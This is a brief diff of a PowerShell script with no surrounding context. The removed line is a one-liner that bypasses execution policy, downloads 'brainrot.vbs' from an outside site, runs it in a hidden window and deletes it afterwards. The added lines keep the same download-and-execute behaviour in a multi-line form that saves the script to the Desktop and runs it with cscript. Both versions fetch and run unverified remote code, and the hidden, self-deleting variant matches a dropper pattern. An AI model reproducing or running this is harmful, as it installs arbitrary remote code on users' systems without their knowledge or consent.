@@ -1,1 +1,7 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$vbsUrl = 'https://spizza.cc/brainrot.vbs'; $vbsContent = (Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing).Content; $vbsContent | Out-File `"$env:TEMP\script.vbs`"; Start-Process `"wscript.exe`" -ArgumentList `"`"`"$env:TEMP\script.vbs`"`"`" -WindowStyle Hidden -Wait; Remove-Item `"$env:TEMP\script.vbs`""
+$vbsUrl = "https://spizza.cc/brainrot.vbs"
+$vbsContent = (Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing).Content
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$vbsFile = "$desktopPath\script.vbs"
+$vbsContent | Out-File $vbsFile -Encoding UTF8
+Start-Process "cscript.exe" -ArgumentList "//NoLogo", $vbsFile -Wait
+Remove-Item $vbsFile -Force
